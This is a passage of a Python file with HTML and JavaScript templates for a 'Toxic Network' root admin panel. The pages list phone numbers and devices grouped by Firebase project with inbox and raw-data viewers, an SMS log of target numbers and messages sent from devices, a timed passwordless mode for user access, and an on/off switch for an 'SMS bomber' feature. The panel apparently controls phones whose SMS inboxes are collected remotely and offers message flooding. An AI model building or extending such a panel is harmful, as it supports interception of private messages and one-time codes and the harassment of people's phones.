          <button class="raw-btn" onclick="event.stopPropagation();openRawData(${numbers.indexOf(n)})" title="Raw Data">🔍</button>
        </div>
        <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
      </div>
    `;
  }).join('');
}

function openRawData(idx){
  if(idx < 0 || idx >= numbers.length) return;
  const n = numbers[idx];
  const url = '/supermasteradmin/debug?fb=' + encodeURIComponent(n.firebase) + '&id=' + encodeURIComponent(n.device_id);
  window.open(url, '_blank');
}

function openInboxGlobal(idx){
  if(idx < 0 || idx >= numbers.length) return;
  openInbox(numbers[idx]);
}'''
).replace(
    '''    document.getElementById('q-dev').textContent = allNumbers.length;''',
    '''    document.getElementById('q-dev').textContent = allNumbers.length;
    if(document.getElementById('q-fb')) document.getElementById('q-fb').textContent = d.firebases_total || 0;'''
).replace(
    '''.arrow{color:#cbd5e1;font-size:20px}''',
    '''.arrow{color:#cbd5e1;font-size:20px}
.card-actions{display:flex;gap:6px;flex-shrink:0}
.raw-btn{padding:8px 10px;background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;border:none;border-radius:6px;font-size:11px;font-weight:900;cursor:pointer;min-height:36px;display:inline-flex;align-items:center;gap:4px;letter-spacing:1px;box-shadow:0 0 10px rgba(255,56,96,.3)}
.raw-btn:active{transform:scale(.94)}'''
)


# ==================== SECURITY HTML (Admin) ====================
SECURITY_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — Security</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#ff3860">
<style>""" + HACKER_BASE_CSS + r"""
body{background:#0a0e1a;color:#e0e6ff;padding:0 0 40px;background-image:radial-gradient(ellipse at top,#1a0a0e 0%,#0a0e1a 60%)}
.topbar{background:#0a0e1a;border-bottom:1px solid #1f2937;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top));box-shadow:0 2px 20px rgba(255,56,96,.08)}
.brand{font-size:16px;font-weight:900;letter-spacing:2px}
.brand .toxic{background:linear-gradient(90deg,#ff3860,#ff9500);-webkit-background-clip:text;background-clip:text;color:transparent;text-shadow:0 0 15px rgba(255,56,96,.3)}
.brand .root-badge{font-size:9px;background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;padding:3px 8px;border-radius:4px;margin-left:6px;font-weight:900;letter-spacing:1px;box-shadow:0 0 10px rgba(255,56,96,.5)}
.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between;margin-top:8px}
@media(min-width:640px){.nav{order:0;width:auto;margin-top:0}}
.nav-link{padding:10px 14px;border-radius:8px;text-decoration:none;font-size:11px;font-weight:700;color:#7a85a8;background:#111827;border:1px solid #1f2937;white-space:nowrap;min-height:42px;display:inline-flex;align-items:center;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
.nav-link:hover{color:#ff3860;border-color:rgba(255,56,96,.3)}
.nav-link.active{background:linear-gradient(135deg,#ff3860,#ff9500);color:#0a0e1a;border-color:transparent;box-shadow:0 0 15px rgba(255,56,96,.4)}
.logout-btn{background:rgba(255,56,96,.1);color:#ff3860;border:1px solid rgba(255,56,96,.3);padding:10px 12px;border-radius:8px;font-size:11px;font-weight:700;text-decoration:none;min-height:42px;display:inline-flex;align-items:center;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
.container{max-width:640px;margin:0 auto;padding:14px}
.card{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:20px;margin-bottom:14px}
.card h3{font-size:13px;color:#ff3860;margin-bottom:6px;font-weight:900;display:flex;align-items:center;gap:8px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace}
.card p.desc{font-size:11px;color:#4a5270;margin-bottom:16px;letter-spacing:1px;line-height:1.6;font-family:'Courier New',monospace}
.field{margin-bottom:14px}
.field label{display:block;font-size:10px;color:#7a85a8;font-weight:700;margin-bottom:6px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace}
.pwd-wrap{position:relative}
.pwd-wrap input{width:100%;padding:14px 48px 14px 14px;border-radius:8px;border:1.5px solid #1f2937;background:#0a0e1a;outline:none;color:#e0e6ff;transition:.2s;font-family:'Courier New',monospace;letter-spacing:1px}
.pwd-wrap input:focus{border-color:#ff3860;background:#050810;box-shadow:0 0 0 3px rgba(255,56,96,.15)}
.pwd-wrap input::placeholder{color:#4a5270}
.toggle-pwd{position:absolute;right:14px;top:50%;transform:translateY(-50%);cursor:pointer;font-size:18px;user-select:none;color:#4a5270;padding:4px}
.toggle-pwd:hover{color:#ff3860}
.btn{padding:14px 20px;border:none;border-radius:8px;font-weight:900;font-size:12px;transition:.2s;width:100%;min-height:50px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace;cursor:pointer}
.btn.primary{background:linear-gradient(135deg,#ff3860,#ff9500);color:#0a0e1a}
.btn.primary:hover{box-shadow:0 0 20px rgba(255,56,96,.5)}
.btn.warning{background:linear-gradient(135deg,#ff3860,#dc2626);color:#fff}
.btn.warning:hover{box-shadow:0 0 20px rgba(255,56,96,.5)}
.btn.green{background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a}
.btn.green:hover{box-shadow:0 0 20px rgba(0,255,65,.5)}
.btn:active{transform:scale(.97)}
.msg{margin-top:12px;padding:12px 14px;border-radius:8px;font-size:11px;display:none;text-align:center;letter-spacing:1px;font-family:'Courier New',monospace}
.msg.ok{background:rgba(0,255,65,.1);color:#00ff41;border:1px solid rgba(0,255,65,.3);display:block}
.msg.err{background:rgba(255,56,96,.1);color:#ff3860;border:1px solid rgba(255,56,96,.3);display:block}
.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#00ff41;color:#0a0e1a;padding:14px 24px;border-radius:8px;font-weight:900;font-size:13px;z-index:9999;transition:transform .3s;pointer-events:none;letter-spacing:1px;font-family:'Courier New',monospace;box-shadow:0 0 30px rgba(0,255,65,.5)}
.toast.show{transform:translateX(-50%) translateY(0)}
.status-display{background:#0a0e1a;border:1px solid #1f2937;border-radius:8px;padding:16px;margin-bottom:14px;display:flex;align-items:center;gap:12px;font-family:'Courier New',monospace}
.status-display .status-icon{font-size:28px;flex-shrink:0}
.status-display .status-info{flex:1}
.status-display .status-label{font-size:10px;color:#4a5270;letter-spacing:2px;text-transform:uppercase;margin-bottom:2px;font-weight:700}
.status-display .status-value{font-size:18px;font-weight:900;letter-spacing:1px}
.status-display.active{border-color:rgba(0,255,65,.4);background:rgba(0,255,65,.05)}
.status-display.active .status-value{color:#00ff41;text-shadow:0 0 10px rgba(0,255,65,.5)}
.status-display.inactive{border-color:rgba(255,56,96,.4);background:rgba(255,56,96,.05)}
.status-display.inactive .status-value{color:#ff3860;text-shadow:0 0 10px rgba(255,56,96,.5)}
.status-display.temp{border-color:rgba(255,215,0,.4);background:rgba(255,215,0,.05)}
.status-display.temp .status-value{color:#ffd700;text-shadow:0 0 10px rgba(255,215,0,.5)}
.status-display.pwdless{border-color:rgba(0,229,255,.4);background:rgba(0,229,255,.05)}
.status-display.pwdless .status-value{color:#00e5ff;text-shadow:0 0 10px rgba(0,229,255,.5)}
.btn-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px}
.btn-row button{padding:12px 8px;font-size:11px}
.timer-row{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:10px}
.timer-row button{padding:10px 4px;font-size:10px;background:#1f2937;border:1px solid #374151;color:#7a85a8;border-radius:6px;font-weight:700;letter-spacing:.5px;font-family:'Courier New',monospace;cursor:pointer}
.timer-row button:hover{border-color:#ffd700;color:#ffd700}
.timer-row button:active{transform:scale(.96)}
.custom-timer{display:flex;gap:6px;margin-bottom:10px}
.custom-timer input{flex:1;padding:10px;background:#0a0e1a;border:1px solid #1f2937;border-radius:6px;color:#e0e6ff;font-family:'Courier New',monospace;outline:none}
.custom-timer input:focus{border-color:#ffd700}
.custom-timer button{padding:10px 14px;background:#ffd700;color:#0a0e1a;border:none;border-radius:6px;font-weight:900;font-size:11px;letter-spacing:1px;font-family:'Courier New',monospace;cursor:pointer}</style></head><body>

<div class="topbar">
<div class="brand"><span class="toxic">☣ TOXIC</span> SECURITY<span class="root-badge">👑 ROOT</span></div>
<a href="/logout" class="logout-btn">⏻ EXIT</a>
<div class="nav">
  <a href="/supermasteradmin/dashboard" class="nav-link">◉ NUMBERS</a>
  <a href="/supermasteradmin/firebases" class="nav-link">🔥 FIREBASES</a>
  <a href="/supermasteradmin/smslogs" class="nav-link">📜 SMS LOGS</a>
  <a href="/supermasteradmin/security" class="nav-link active">🔒 SECURITY</a>
</div>
</div>

<div class="container">

<div class="card">
<h3>⚡ USER PANEL CONTROL</h3>
<p class="desc">Activate / deactivate user panel. Set temporary access with auto-expiry. Toggle passwordless entry.</p>

<div id="panel-status-display" class="status-display">
<div class="status-icon">⏳</div>
<div class="status-info">
<div class="status-label">PANEL STATUS</div>
<div class="status-value" id="panel-status-val">LOADING...</div>
</div>
</div>

<div style="margin-bottom:10px;font-size:10px;color:#4a5270;letter-spacing:1.5px;text-transform:uppercase;font-weight:700">▸ QUICK TOGGLE</div>
<div class="btn-row">
<button class="btn green" onclick="panelActivate(0)">🟢 ACTIVATE (∞)</button>
<button class="btn warning" onclick="panelDeactivate()">🔴 DEACTIVATE</button>
</div>

<div style="margin-bottom:10px;font-size:10px;color:#4a5270;letter-spacing:1.5px;text-transform:uppercase;font-weight:700">▸ TEMPORARY ACTIVATION</div>
<div class="timer-row">
<button onclick="panelActivate(15)">15m</button>
<button onclick="panelActivate(60)">1h</button>
<button onclick="panelActivate(360)">6h</button>
<button onclick="panelActivate(1440)">24h</button>
</div>
<div class="custom-timer">
<input type="number" id="custom-min" placeholder="Custom minutes" min="1">
<button onclick="panelActivate(parseInt(document.getElementById('custom-min').value)||0)">SET</button>
</div>

<div style="margin-top:16px;margin-bottom:10px;font-size:10px;color:#4a5270;letter-spacing:1.5px;text-transform:uppercase;font-weight:700">▸ PASSWORDLESS MODE</div>
<div class="btn-row">
<button class="btn green" onclick="setPasswordless(true)">🔓 ENABLE (∞)</button>
<button class="btn warning" onclick="setPasswordless(false)">🔒 DISABLE</button>
</div>
<div class="timer-row">
<button onclick="setPasswordless(true, 15)">15m</button>
<button onclick="setPasswordless(true, 60)">1h</button>
<button onclick="setPasswordless(true, 360)">6h</button>
<button onclick="setPasswordless(true, 1440)">24h</button>
</div>

<div class="msg" id="panel-msg"></div>
</div>

<div class="card">
<h3>💣 SMS BOMBER CONTROL</h3>
<p class="desc">On/Off toggle for user SMS Bomber feature.</p>
<div class="btn-row">
<button class="btn green" onclick="toggleBomber(true)">🟢 ENABLE</button>
<button class="btn warning" onclick="toggleBomber(false)">🔴 DISABLE</button>
</div>
<div class="msg" id="bomber-msg"></div>
</div>

<div class="card">
<h3>👑 CHANGE ADMIN PASSWORD</h3>
<p class="desc">ROOT PANEL LOGIN PASSWORD. PERSISTS IN MONGODB.</p>
<div class="field">
<label>▸ NEW ADMIN PASSWORD</label>
<div class="pwd-wrap">
<input type="password" id="admin-pwd" placeholder="ENTER NEW ROOT PASSWORD">
<span class="toggle-pwd" onclick="togglePwd('admin-pwd', event)">👁</span>
</div>
</div>
<button class="btn warning" onclick="changeAdminPwd()">▶ UPDATE ROOT PASSWORD</button>
<div class="msg" id="admin-msg"></div>
</div>

</div>

<div id="toast" class="toast"></div>

<script>
let panelStatusTimer = null;

function toast(text){ const t = document.getElementById('toast'); t.textContent = text; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 2500); }
function togglePwd(id, e){ const i = document.getElementById(id); const t = e.target; if(i.type === 'password'){ i.type = 'text'; t.textContent = '🙈'; } else { i.type = 'password'; t.textContent = '👁'; } }
function showMsg(id, text, type){ const el = document.getElementById(id); el.className = 'msg ' + type; el.textContent = text; if(type === 'ok') setTimeout(()=>{ el.className = 'msg'; }, 3000); }

function formatRemaining(secs){
  if(secs <= 0) return 'EXPIRED';
  const h = Math.floor(secs/3600);
  const m = Math.floor((secs%3600)/60);
  const s = secs%60;
  if(h > 0) return `${h}h ${m}m ${s}s`;
  if(m > 0) return `${m}m ${s}s`;
  return `${s}s`;
}

async function loadPanelStatus(){
  try{
    const r = await fetch('/api/panel/status');
    const d = await r.json();
    if(!d.success) return;
    const display = document.getElementById('panel-status-display');
    const val = document.getElementById('panel-status-val');
    const now = Math.floor(Date.now()/1000);
    if(!d.active){
      display.className = 'status-display inactive';
      display.querySelector('.status-icon').textContent = '🔴';
      val.textContent = 'DEACTIVATED';
    } else if(d.passwordless){
      display.className = 'status-display pwdless';
      display.querySelector('.status-icon').textContent = '🔓';
      val.textContent = 'PASSWORDLESS · ACTIVE';
    } else if(d.expires_at > 0){
      const rem = Math.max(0, d.expires_at - now);
      display.className = 'status-display temp';
      display.querySelector('.status-icon').textContent = '⏱';
      val.textContent = 'TEMP · ' + formatRemaining(rem);
    } else {
      display.className = 'status-display active';
      display.querySelector('.status-icon').textContent = '🟢';
      val.textContent = 'ACTIVE · UNLIMITED';
    }
  }catch(e){}
}

async function panelActivate(minutes){
  try{
    const r = await fetch('/api/panel/activate', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({minutes: minutes}) });
    const d = await r.json();
    if(d.success){
      const msg = minutes > 0 ? `✅ PANEL ACTIVATED FOR ${minutes} MINUTES` : '✅ PANEL ACTIVATED (UNLIMITED)';
      showMsg('panel-msg', msg, 'ok'); toast(msg); loadPanelStatus();
    } else { showMsg('panel-msg', '❌ ' + (d.error || 'ERROR'), 'err'); }
  }catch(e){ showMsg('panel-msg', '❌ NETWORK ERROR', 'err'); }
}

async function panelDeactivate(){
  if(!confirm('Deactivate user panel? Users will be blocked immediately.')) return;
  try{
    const r = await fetch('/api/panel/deactivate', { method: 'POST', headers: {'Content-Type': 'application/json'} });
    const d = await r.json();
    if(d.success){ showMsg('panel-msg', '✅ PANEL DEACTIVATED', 'ok'); toast('🔴 DEACTIVATED'); loadPanelStatus(); }
    else { showMsg('panel-msg', '❌ ' + (d.error || 'ERROR'), 'err'); }
  }catch(e){ showMsg('panel-msg', '❌ NETWORK ERROR', 'err'); }
}

async function setPasswordless(enabled, minutes){
  try{
    const r = await fetch('/api/panel/passwordless', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({enabled: enabled, minutes: minutes || 0}) });
    const d = await r.json();
    if(d.success){
      let msg = enabled ? '✅ PASSWORDLESS ENABLED' : '✅ PASSWORDLESS DISABLED';
      if(enabled && minutes > 0) msg = `✅ PASSWORDLESS FOR ${minutes} MINUTES`;
      showMsg('panel-msg', msg, 'ok'); toast(msg); loadPanelStatus();
    } else { showMsg('panel-msg', '❌ ' + (d.error || 'ERROR'), 'err'); }
  }catch(e){ showMsg('panel-msg', '❌ NETWORK ERROR', 'err'); }
}

async function toggleBomber(enabled){
  try{
    const r = await fetch('/api/panel/bomber', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({enabled}) });
    const d = await r.json();
    if(d.success){ showMsg('bomber-msg', `✅ SMS BOMBER ${enabled ? 'ENABLED' : 'DISABLED'}`, 'ok'); toast('✅ SAVED'); }
    else { showMsg('bomber-msg', '❌ ' + (d.error || 'ERROR'), 'err'); }
  }catch(e){ showMsg('bomber-msg', '❌ NETWORK ERROR', 'err'); }
}

async function changeAdminPwd(){
  const pwd = document.getElementById('admin-pwd').value.trim();
  if(!pwd || pwd.length < 4){ showMsg('admin-msg', '❌ MIN 4 CHARS', 'err'); return; }
  const r = await fetch('/api/security/change', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({role: 'admin', password: pwd}) });
  const d = await r.json();
  if(d.success){ showMsg('admin-msg', '✅ ROOT PASSWORD SAVED', 'ok'); document.getElementById('admin-pwd').value = ''; toast('✅ CHANGED'); }
  else { showMsg('admin-msg', '❌ ' + (d.error || 'ERROR'), 'err'); }
}

loadPanelStatus();
panelStatusTimer = setInterval(loadPanelStatus, 3000);
</script>
</body>
</html>
"""


# ==================== SMS LOGS HTML ====================
SMS_LOGS_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — SMS Logs</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#ff3860">
<style>""" + HACKER_BASE_CSS + r"""
body{background:#0a0e1a;color:#e0e6ff;padding:0 0 40px;background-image:radial-gradient(ellipse at top,#1a0a0e 0%,#0a0e1a 60%)}
.topbar{background:#0a0e1a;border-bottom:1px solid #1f2937;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top));box-shadow:0 2px 20px rgba(255,56,96,.08)}
.brand{font-size:16px;font-weight:900;letter-spacing:2px}
.brand .toxic{background:linear-gradient(90deg,#ff3860,#ff9500);-webkit-background-clip:text;background-clip:text;color:transparent;text-shadow:0 0 15px rgba(255,56,96,.3)}
.brand .root-badge{font-size:9px;background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;padding:3px 8px;border-radius:4px;margin-left:6px;font-weight:900;letter-spacing:1px;box-shadow:0 0 10px rgba(255,56,96,.5)}
.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between;margin-top:8px}
@media(min-width:640px){.nav{order:0;width:auto;margin-top:0}}
.nav-link{padding:10px 14px;border-radius:8px;text-decoration:none;font-size:11px;font-weight:700;color:#7a85a8;background:#111827;border:1px solid #1f2937;white-space:nowrap;min-height:42px;display:inline-flex;align-items:center;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
.nav-link:hover{color:#ff3860;border-color:rgba(255,56,96,.3)}
.nav-link.active{background:linear-gradient(135deg,#ff3860,#ff9500);color:#0a0e1a;border-color:transparent;box-shadow:0 0 15px rgba(255,56,96,.4)}
.logout-btn{background:rgba(255,56,96,.1);color:#ff3860;border:1px solid rgba(255,56,96,.3);padding:10px 12px;border-radius:8px;font-size:11px;font-weight:700;text-decoration:none;min-height:42px;display:inline-flex;align-items:center;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
.container{max-width:900px;margin:0 auto;padding:14px}
.log-card{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:14px;margin-bottom:10px;position:relative;overflow:hidden}
.log-card::before{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:#ff3860;opacity:.6}
.log-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;flex-wrap:wrap;gap:8px}
.log-target{font-size:14px;font-weight:900;color:#ff3860;letter-spacing:.5px;font-family:'Courier New',monospace}
.log-time{font-size:10px;color:#4a5270;font-family:'Courier New',monospace}
.log-msg{font-size:12px;color:#c5d0e6;font-family:'Courier New',monospace;line-height:1.5;background:#0a0e1a;padding:10px;border-radius:6px;border:1px solid #1f2937;margin-bottom:8px}
.log-meta{display:flex;gap:8px;flex-wrap:wrap;font-size:9px;color:#7a85a8;letter-spacing:1px;font-family:'Courier New',monospace}
.log-meta span{background:rgba(255,56,96,.1);padding:2px 8px;border-radius:4px;border:1px solid rgba(255,56,96,.3);color:#ff9500}
.empty{text-align:center;padding:50px 20px;color:#4a5270;font-size:12px;background:#111827;border:1px solid #1f2937;border-radius:10px;letter-spacing:1px;font-family:'Courier New',monospace}
.spinner{display:inline-block;width:14px;height:14px;border:2px solid #1f2937;border-top-color:#ff3860;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}</style></head><body>

<div class="topbar">
<div class="brand"><span class="toxic">☣ TOXIC</span> LOGS<span class="root-badge">👑 ROOT</span></div>
<a href="/logout" class="logout-btn">⏻ EXIT</a>
<div class="nav">
  <a href="/supermasteradmin/dashboard" class="nav-link">◉ NUMBERS</a>
  <a href="/supermasteradmin/firebases" class="nav-link">🔥 FIREBASES</a>
  <a href="/supermasteradmin/smslogs" class="nav-link active">📜 SMS LOGS</a>
  <a href="/supermasteradmin/security" class="nav-link">🔒 SECURITY</a>
</div>
</div>

<div class="container">
<div id="logs-container"><div class="empty"><span class="spinner"></span> LOADING LOGS...</div></div>
</div>

<script>
async function loadLogs(){
  try{
    const r = await fetch('/api/sms/logs');
    const d = await r.json();
    const box = document.getElementById('logs-container');
    if(!d.success){ box.innerHTML = '<div class="empty">❌ '+(d.error||'ERROR')+'</div>'; return; }
    const logs = d.logs || [];
    if(logs.length === 0){ box.innerHTML = '<div class="empty">📭 NO SMS LOGS YET</div>'; return; }
    box.innerHTML = logs.map(l => {
      const time = new Date(l.timestamp * 1000).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true });
      return `
        <div class="log-card">
          <div class="log-head">
            <div class="log-target">📞 ${escapeHtml(l.target)}</div>
            <div class="log-time">${time}</div>
          </div>
          <div class="log-msg">💬 ${escapeHtml(l.message)}</div>
          <div class="log-meta">
            <span>👤 DEVICE: ${escapeHtml(l.device_id)}</span>
            <span>🔢 COUNT: ${l.count}x</span>
          </div>
        </div>`;
    }).join('');
  }catch(e){ document.getElementById('logs-container').innerHTML = '<div class="empty">❌ NETWORK ERROR</div>'; }
}
function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
loadLogs();
setInterval(loadLogs, 10000);
</script>
</body></html>
"""


# ==================== FIREBASES HTML ====================
FIREBASES_HTML = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — Firebases</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="theme-color" content="#ff3860">
<style>""" + HACKER_BASE_CSS + r"""
body{background:#0a0e1a;color:#e0e6ff;padding:0 0 40px;background-image:radial-gradient(ellipse at top,#1a0a0e 0%,#0a0e1a 60%)}
.topbar{background:#0a0e1a;border-bottom:1px solid #1f2937;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top));box-shadow:0 2px 20px rgba(255,56,96,.08)}
.brand{font-size:16px;font-weight:900;letter-spacing:2px}
.brand .toxic{background:linear-gradient(90deg,#ff3860,#ff9500);-webkit-background-clip:text;background-clip:text;color:transparent}
.brand .root-badge{font-size:9px;background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;padding:3px 8px;border-radius:4px;margin-left:6px;font-weight:900;letter-spacing:1px}
.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between;margin-top:8px}
@media(min-width:640px){.nav{order:0;width:auto;margin-top:0}}
.nav-link{padding:10px 14px;border-radius:8px;text-decoration:none;font-size:11px;font-weight:700;color:#7a85a8;background:#111827;border:1px solid #1f2937;white-space:nowrap;min-height:42px;display:inline-flex;align-items:center;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
.nav-link:hover{color:#ff3860;border-color:rgba(255,56,96,.3)}
.nav-link.active{background:linear-gradient(135deg,#ff3860,#ff9500);color:#0a0e1a;border-color:transparent;box-shadow:0 0 15px rgba(255,56,96,.4)}
.conn{display:flex;align-items:center;gap:6px;font-size:10px;font-weight:700;padding:6px 10px;border-radius:6px;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
.conn.online{color:#00ff41;background:rgba(0,255,65,.1);border:1px solid rgba(0,255,65,.3)}
.conn.offline{color:#ff3860;background:rgba(255,56,96,.1);border:1px solid rgba(255,56,96,.3)}
.conn .dot{width:7px;height:7px;border-radius:50%;background:currentColor;box-shadow:0 0 8px currentColor}
.container{max-width:900px;margin:0 auto;padding:14px}
.card{background:#111827;border:1px solid #1f2937;border-radius:10px;padding:16px;margin-bottom:14px}
.card h3{font-size:12px;color:#ff3860;margin-bottom:12px;font-weight:900;display:flex;align-items:center;gap:8px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace}
.add-row{display:flex;gap:8px;flex-wrap:wrap}
.add-row input{flex:1;min-width:180px;padding:14px 12px;border-radius:8px;border:1.5px solid #1f2937;background:#0a0e1a;outline:none;color:#e0e6ff;font-family:'Courier New',monospace;letter-spacing:1px}
.add-row input:focus{border-color:#ff3860;box-shadow:0 0 0 3px rgba(255,56,96,.15)}
.add-row input::placeholder{color:#4a5270}
button{padding:14px 18px;border:none;border-radius:8px;font-weight:900;font-size:12px;transition:.2s;min-height:50px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace;cursor:pointer}
button.primary{background:linear-gradient(135deg,#ff3860,#ff9500);color:#0a0e1a}
button.primary:hover{box-shadow:0 0 20px rgba(255,56,96,.5)}
button.gray{background:#1f2937;color:#7a85a8;border:1px solid #374151}
button.danger{background:rgba(255,56,96,.1);color:#ff3860;border:1px solid rgba(255,56,96,.3)}
button.danger-solid{background:linear-gradient(135deg,#ff3860,#dc2626);color:#fff}
button.danger-solid:hover{box-shadow:0 0 20px rgba(255,56,96,.5)}
button.green{background:linear-gradient(135deg,#00ff41,#00e5ff);color:#0a0e1a}
button:active{transform:scale(.97)}
.bulk-area{margin-top:10px;display:none}
.bulk-area textarea{width:100%;padding:14px 12px;border-radius:8px;border:1.5px solid #1f2937;background:#0a0e1a;font-size:12px;min-height:120px;font-family:'Courier New',monospace;outline:none;color:#e0e6ff;resize:vertical;letter-spacing:.5px}
.bulk-area textarea:focus{border-color:#ff3860;box-shadow:0 0 0 3px rgba(255,56,96,.15)}
.bulk-area button{margin-top:8px}
.msg{margin-top:10px;padding:12px 14px;border-radius:8px;font-size:11px;display:none;letter-spacing:1px;font-family:'Courier New',monospace}
.msg.ok{background:rgba(0,255,65,.1);color:#00ff41;border:1px solid rgba(0,255,65,.3);display:block}
.msg.err{background:rgba(255,56,96,.1);color:#ff3860;border:1px solid rgba(255,56,96,.3);display:block}
.fb-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:10px}
.fb-header h2{font-size:12px;font-weight:900;color:#ff3860;display:flex;align-items:center;gap:8px;letter-spacing:1.5px;text-transform:uppercase;font-family:'Courier New',monospace}
.fb-header .actions{display:flex;gap:6px;flex-wrap:wrap}
.fb-header .actions button{padding:10px 12px;font-size:10px;min-height:44px}
.fb-list{display:grid;gap:10px}
.fb-card{background:#0a0e1a;border:1px solid #1f2937;border-radius:10px;padding:14px;display:flex;align-items:center;gap:12px;transition:.15s;flex-wrap:wrap;position:relative;overflow:hidden}
.fb-card::before{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:linear-gradient(180deg,#ff3860,#ff9500);opacity:0;transition:.2s}
.fb-card:hover{border-color:rgba(255,56,96,.3)}
.fb-card:hover::before{opacity:1}
.fb-icon{width:44px;height:44px;border-radius:8px;background:rgba(255,149,0,.15);border:1px solid rgba(255,149,0,.3);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;color:#ff9500}
.fb-info{flex:1;min-width:0;cursor:pointer}
.fb-name{font-size:13px;font-weight:900;color:#e0e6ff;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:flex;align-items:center;gap:6px;flex-wrap:wrap;letter-spacing:.5px;font-family:'Courier New',monospace}
.fb-hash{font-size:10px;color:#4a5270;margin-top:2px;font-family:'Courier New',monospace;word-break:break-all;letter-spacing:1px}
.fb-counts{display:flex;gap:6px;margin-top:6px;flex-wrap:wrap}
.fb-count-pill{display:inline-flex;align-items:center;gap:4px;font-size:10px;font-weight:700;padding:3px 8px;border-radius:4px;letter-spacing:1px;font-family:'Courier New',monospace}
.fb-count-pill.online{background:rgba(0,255,65,.15);color:#00ff41;border:1px solid rgba(0,255,65,.3)}
.fb-count-pill.offline{background:rgba(255,56,96,.15);color:#ff3860;border:1px solid rgba(255,56,96,.3)}
.fb-count-pill.devices{background:rgba(0,229,255,.15);color:#00e5ff;border:1px solid rgba(0,229,255,.3)}
.fb-count-pill .dot{width:6px;height:6px;border-radius:50%;background:currentColor;box-shadow:0 0 6px currentColor}
.fb-actions{display:flex;gap:6px;flex-shrink:0}
.fb-actions button{padding:10px 12px;font-size:11px;min-height:44px}
.checkbox{width:24px;height:24px;border:2px solid #374151;border-radius:6px;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;transition:.2s;background:#0a0e1a;color:#0a0e1a;font-size:14px;font-weight:900}
.checkbox.checked{background:linear-gradient(135deg,#ff3860,#ff9500);border-color:#ff3860;color:#fff;box-shadow:0 0 10px rgba(255,56,96,.4)}
.select-all{display:flex;align-items:center;gap:10px;padding:12px 16px;background:#0a0e1a;border:1px solid #1f2937;border-radius:8px;margin-bottom:12px;font-size:11px;font-weight:700;color:#7a85a8;cursor:pointer;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
.empty{text-align:center;padding:50px 20px;color:#4a5270;font-size:12px;background:#111827;border:1px solid #1f2937;border-radius:10px;letter-spacing:1px;font-family:'Courier New',monospace}
.confirm-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.85);display:none;align-items:center;justify-content:center;z-index:200;padding:20px;backdrop-filter:blur(4px)}
.confirm-overlay.show{display:flex}
